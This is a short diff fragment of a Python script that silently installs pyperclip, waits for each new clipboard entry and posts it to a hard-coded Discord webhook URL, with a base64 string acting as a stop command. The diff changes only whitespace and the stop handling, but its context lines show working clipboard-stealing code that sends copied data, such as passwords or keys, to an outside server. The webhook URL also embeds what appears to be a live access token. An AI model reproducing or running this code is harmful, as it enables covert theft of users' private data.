@@ -35,7 +35,7 @@ except:
 	os.system("py -m pip install pyperclip")
 finally:
 	import pyperclip
-
+	
 while True:
 	newCOPY = pyperclip.waitForNewPaste()
 	# print(newCOPY)
@@ -47,5 +47,5 @@ while True:
 	ping = requests.post('https://discord.com/api/webhooks/960113345959178290/ITfAMUa1x0IPDvGmIdWWbLewCa6JeMLDPcftMSrMJ6PHS31PnEAsA9J9ATena3Rt-dAr', json=usrhook)
 	if newCOPY == "Q01EOlNUT1BbbV1Lb3BpZXI=":
 		print('DETECTING...')
-		stopSEND()
+		raise Exception
 		break
